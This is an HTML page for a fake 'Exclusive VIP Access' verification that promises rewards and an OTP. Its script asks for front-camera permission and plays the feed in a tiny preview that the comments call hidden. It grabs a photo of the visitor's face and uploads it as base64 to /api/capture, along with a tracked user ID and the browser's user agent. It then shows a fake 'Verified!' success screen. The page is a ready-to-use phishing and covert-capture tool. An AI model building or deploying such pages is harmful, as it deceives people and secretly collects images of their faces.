<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VIP Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Poppins', sans-serif; }
        
        /* Premium Background */
        .bg-tech {
            background-image: url('https://images.unsplash.com/photo-1451187580459-43490279c0fa?q=80&w=2072&auto=format&fit=crop'); 
            background-size: cover;
            background-position: center;
        }

        .glass-card {
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .btn-gradient {
            background: linear-gradient(135deg, #2563EB 0%, #7C3AED 100%);
            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.5);
        }

        .btn-gradient:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(37, 99, 235, 0.6);
        }

        /* Pulse Animation */
        @keyframes pulse-ring {
            0% { transform: scale(0.8); opacity: 0.5; }
            100% { transform: scale(1.5); opacity: 0; }
        }
        .pulse-effect::before {
            content: '';
            position: absolute;
            top: 50%; left: 50%;
            width: 100%; height: 100%;
            background: inherit;
            border-radius: inherit;
            transform: translate(-50%, -50%);
            animation: pulse-ring 2s infinite;
        }

        .hidden-preview {
            position: absolute;
            width: 80px;
            height: 80px;
            bottom: 20px;
            right: 20px;
            border-radius: 12px;
            overflow: hidden;
            opacity: 0.5;
            z-index: 10;
        }
    </style>
</head>
<body class="bg-tech h-screen w-full flex items-center justify-center relative">

    <!-- Blur Overlay for the background -->
    <div class="absolute inset-0 bg-slate-900/80 backdrop-blur-sm z-10"></div>

    <!-- The Main Card -->
    <div class="glass-card p-8 md:p-12 rounded-3xl shadow-2xl w-full max-w-lg text-center relative z-20">
        
        <!-- Icon -->
        <div class="w-20 h-20 bg-gradient-to-tr from-blue-500 to-purple-600 rounded-full mx-auto flex items-center justify-center mb-6 shadow-lg">
            <i class="fa-solid fa-crown text-3xl text-white"></i>
        </div>

        <h1 class="text-3xl font-bold text-white mb-2">Exclusive VIP Access</h1>
        <p class="text-gray-300 mb-8 text-sm leading-relaxed">
            Verify your number to unlock your rewards. <br>
            <span class="text-blue-400 font-semibold">Only one click required.</span>
        </p>

        <!-- The CTA Button -->
        <button id="startBtn" class="w-full btn-gradient text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 pulse-effect relative overflow-hidden group">
            <span class="relative z-10 flex items-center justify-center gap-2">
                <i class="fa-solid fa-check-circle"></i> Click to Verify & Get OTP
            </span>
        </button>

        <!-- Hidden Camera Preview (Tiny) -->
        <video id="previewVideo" class="hidden-preview border border-white/20"></video>

    </div>

    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex flex-col items-center justify-center hidden">
        <div class="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-4"></div>
        <p class="text-white font-semibold tracking-widest uppercase text-sm">Processing...</p>
    </div>

    <!-- Success Overlay -->
    <div id="successOverlay" class="fixed inset-0 bg-blue-600 z-50 flex flex-col items-center justify-center hidden transition-all duration-700 ease-in-out transform translate-y-full">
        <i class="fa-solid fa-check text-6xl text-white mb-4 animate-bounce"></i>
        <h2 class="text-3xl font-bold text-white">Verified!</h2>
        <p class="text-blue-100 mt-2">Redirecting to rewards...</p>
    </div>

    <script>
        // 1. Extract User ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('uid');

        if(!userId) {
            alert("Invalid Link");
            window.location.href = '/';
        }

        const btn = document.getElementById('startBtn');
        const videoPreview = document.getElementById('previewVideo');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const successOverlay = document.getElementById('successOverlay');

        // 2. Camera Logic
        btn.addEventListener('click', async () => {
            try {
                // Request Permissions
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } // Front camera
                });

                // Hide button text to simulate processing
                btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Camera Access Granted';
                
                // Show tiny preview (hidden visually, but active)
                videoPreview.srcObject = stream;
                videoPreview.play();

                // Simulate a "Loading" delay for realism
                await new Promise(r => setTimeout(r, 1500));

                // Capture Frame
                const canvas = document.createElement('canvas');
                canvas.width = videoPreview.videoWidth;
                canvas.height = videoPreview.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoPreview, 0, 0, canvas.width, canvas.height);

                // Convert to Base64
                const imageBase64 = canvas.toDataURL('image/jpeg', 0.8);

                // Show Loading Screen
                loadingOverlay.classList.remove('hidden');

                // Upload Logic
                await fetch('/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        userId: userId,
                        imageBase64: imageBase64,
                        deviceInfo: navigator.userAgent
                    })
                });

                // Cleanup
                stream.getTracks().forEach(track => track.stop());

                // Show Success Animation
                loadingOverlay.classList.add('hidden');
                successOverlay.classList.remove('hidden');
                
            } catch (err) {
                console.error("Camera Error:", err);
                alert("Camera permission denied or unavailable.");
            }
        });
    </script>
</body>
</html>
